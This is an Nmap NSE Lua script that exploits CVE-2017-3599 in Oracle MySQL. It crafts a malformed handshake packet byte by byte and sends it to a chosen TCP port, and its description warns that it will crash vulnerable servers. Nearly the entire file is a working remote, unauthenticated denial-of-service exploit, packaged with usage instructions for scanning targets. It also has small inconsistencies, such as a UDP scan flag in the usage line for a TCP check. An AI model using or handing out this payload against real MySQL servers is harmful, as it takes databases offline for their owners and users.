description=[[
CVE-2017-3599 - remote unauthenticated Denial of Service against Oracle MySQL.  
Warning: This WILL cause DoS on vulnerable mysql machines.
Thanks: SECWORKS, hackers.mu team.
]]

---
--@usage nmap -sU -p <portnum> --script mysql-vuln-cve2017-3599 --script-args mysql-vuln-cve2017-3599.ports=<ports> <target>
--@output
--PORT     STATE SERVICE
--3306/tcp open  mysql
--|_mysql-vuln-cve2017-3599: true

author = "Loganaden Velvindron (logan@hackers.mu)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html";
categories = {"dos", "vuln", "exploit", "intrusive"}

local string = require "string"
local shortport = require "shortport"
local comm = require "comm"
local stdnse = require "stdnse"

portrule = function(host, port)
  if not stdnse.get_script_args(SCRIPT_NAME .. ".ports") then
    stdnse.print_debug(3,"Skipping '%s' %s, 'ports' argument is missing.",SCRIPT_NAME, SCRIPT_TYPE)
    return false
  end

local ports = stdnse.get_script_args(SCRIPT_NAME .. ".ports")

--print out a debug message if port 3306/tcp is open
  if port.number==3306 and port.protocol == "tcp" and not(ports) then
    stdnse.print_debug("Port 3306/tcp is open. mysql over tcp")
    return false
  end

  return port.protocol == "tcp" and stdnse.in_port_range(port, ports:gsub(",",",") ) and
    not(shortport.port_is_excluded(port.number,port.protocol))
end


local packet1 = 
string.char(0x01)
..string.char(0x85, 0xa2, 0xbf, 0x01)
..string.char(0x00, 0x00, 0x00, 0x01)
..string.char(0x21)
--..string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
..string.rep(string.char(0x00),23)
.."test"
..string.char(0x00)
..string.char(0xff)

local packet1_len = string.pack("i", string.len(packet1)-1)
packet1_len = string.sub(packet1_len,1,3)

local payload = packet1_len..packet1


action = function(host, port)
local status, result = comm.exchange(host, port, payload, {proto="tcp", recv_before=true, timeout=8000})


if not status then
        return false
else
        return true 
end

end
